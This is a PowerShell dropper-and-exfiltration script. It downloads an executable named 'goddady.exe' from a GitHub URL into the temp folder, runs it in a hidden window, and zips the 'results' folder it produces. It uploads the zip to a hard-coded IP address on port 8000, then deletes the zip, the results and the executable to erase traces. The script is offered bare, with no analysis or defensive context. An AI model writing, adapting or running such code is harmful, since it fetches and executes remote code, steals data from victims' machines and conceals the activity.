$exeName = 'goddady.exe'; # Name of the executable
$zipUrl = 'http://129.212.192.8:8000'; # Replace with the URL to receive the zip file
$exePath = Join-Path $env:TEMP $exeName; # Download to temp
$resultsFolder = Join-Path $env:TEMP 'results'; # Results folder in temp
$zipPath = Join-Path $env:TEMP 'results.zip'; # Zip file in temp

try {
    if (-not (Test-Path $exePath -PathType Leaf)) {
        iwr -Uri 'https://github.com/AndreiVladescu/Powershell-Scripts/raw/refs/heads/main/goddady.exe' -OutFile $exePath; # Download to temp
    }

    Start-Process -FilePath cmd.exe -ArgumentList "/c cd /d $env:TEMP && $exeName" -WindowStyle Hidden -Wait;

    Start-Sleep -Seconds 5;

    if (Test-Path $resultsFolder -PathType Container) {
        Add-Type -AssemblyName 'System.IO.Compression.FileSystem';
        [System.IO.Compression.ZipFile]::CreateFromDirectory($resultsFolder, $zipPath);

        $webClient = New-Object System.Net.WebClient;
        $webClient.UploadFile($zipUrl, $zipPath);

        Remove-Item $zipPath;
        Remove-Item -Recurse -Force $resultsFolder;
        Remove-Item $exePath; # Remove the exe from temp
    }

} catch {
    #Write-Error $_;
}
